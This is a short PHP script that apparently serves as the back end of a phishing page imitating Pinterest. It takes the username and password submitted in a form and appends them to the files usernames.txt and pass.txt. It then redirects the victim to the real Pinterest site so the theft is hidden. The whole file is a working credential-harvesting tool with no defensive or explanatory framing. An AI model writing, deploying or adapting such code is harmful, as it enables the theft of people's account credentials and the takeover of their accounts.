<?php

file_put_contents("usernames.txt", "Pinterest Username : " . $email = $_POST['id'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Pinterest Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.pinterest.com');
?>
